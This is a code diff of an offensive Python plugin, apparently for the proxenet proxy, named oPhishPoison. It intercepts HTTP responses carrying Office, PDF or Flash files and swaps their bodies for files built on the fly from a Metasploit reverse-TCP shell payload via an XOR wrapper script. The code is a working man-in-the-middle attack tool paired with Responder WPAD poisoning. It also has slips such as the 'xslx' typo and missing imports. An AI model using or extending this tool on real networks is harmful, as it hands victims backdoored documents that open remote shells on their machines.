@@ -8,44 +8,85 @@ How to use:
 - Start Responder and point WPAD to proxenet
   ex: # ./Responder.py -v -w -I vboxnet0 -u 192.168.56.1:8008
 
-Point
 TODO:
-- in request, detect filename from path
-- fully automate the generation on-the-fly with https://gist.github.com/hugsy/18aa43255fd4d905a379
+- add html poisoning: inject b33f javascript
+- move the settings into the .proxenet.ini config file
 """
 
 __PLUGIN__ = "oPhishPoison"
 __AUTHOR__ = "@_hugsy_"
 
 
-from pimp import HTTPResponse
+from pimp import HTTPResponse, HTTPBadResponseException
 
-types = {"doc": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
-         "xls": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+
+path_to_msfpayload   = "/home/hugsy/tmp/revshtcp"
+path_to_python       = "/usr/bin/python2.7"
+path_to_xor_payload  = "/home/hugsy/code/xor-payload/xor-payload.py"
+
+types = {"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+         "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
+         "pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+         "doc": "application/msword",
+         "xls": "application/msexcel",
+         "ppt": "application/vnd.ms-powerpoint",
+         "pdf": "application/pdf",
+         "swf": "application/x-shockwave-flash",
          }
 
 
 def is_supported_type(t):
+    """
+    Checks if the content type is supported by our poisoining plugins. If not, the request will
+    not be tampered.
+    """
     for k,v in types.iteritems():
-        if v.lower() == t.lower():
-            return k
+        if v.lower() == t.lower():  return k
     return None
 
-def insert_malicious_word(http):
-    with open("/home/chris/tmp/docs/PhpOperator.docx") as f:
+
+def replace_with_malicious(http, ctype):
+    """
+    1. generate on-the-fly the right payload
+    2. replace the HTTP body
+    3. profit
+    """
+
+    # 1.
+    cmd = "{python} {xor} --quiet".format(python=path_to_python, xor=path_to_xor_payload)
+    if ctype in ("xslx", "xls"):    cmd += "--excel"
+    elif ctype in ("docx", "doc"):  cmd += "--word"
+    elif ctype in ("pptx", "ppt"):  cmd += "--powerpoint"
+    elif ctype == "pdf":            cmd += "--pdf"
+    elif ctype == "swf":            cmd += "--flash"
+
+    f = open(path_to_msfpayload, "rb")
+    p = subprocess.Popen(cmd.split(" "), stdin=f)
+    res = p.communicate()[0]
+    f.close()
+
+    #2.
+    with open(res, "rb") as f:
         http.body = f.read()
+
+    os.unlink(res)
+
+    # 3.
     return
 
-def insert_malicious_excel(http):
-    with open("/home/chris/tmp/docs/Book.xlsx.exe") as f:
-        http.body = f.read()
-    return
 
 def proxenet_request_hook(rid, request, uri):
-    # todo
+    """
+    proxenet_request_hook() is not useful
+    """
     return request
 
+
 def proxenet_response_hook(rid, response, uri):
+    """
+    When a HTTP response header is received, check if it has a supported content type.
+    If so, inject our payload.
+    """
     try:
         http = HTTPResponse(response)
 
@@ -58,13 +99,14 @@ def proxenet_response_hook(rid, response, uri):
             del(http)
             return response
 
-        if detected_type == "doc":
-            insert_malicious_word(http)
-        elif detected_type == "xls":
-            insert_malicious_excel(http)
+        replace_with_malicious(http, detected_type)
 
         print("Poisoining {} file in response {}: {}".format(detected_type, rid, http.headers))
         return http.render()
 
-    except Exception as e :
+    except HTTPBadResponseException as e :
         return response
+
+
+if __name__ == "__main__":
+    pass
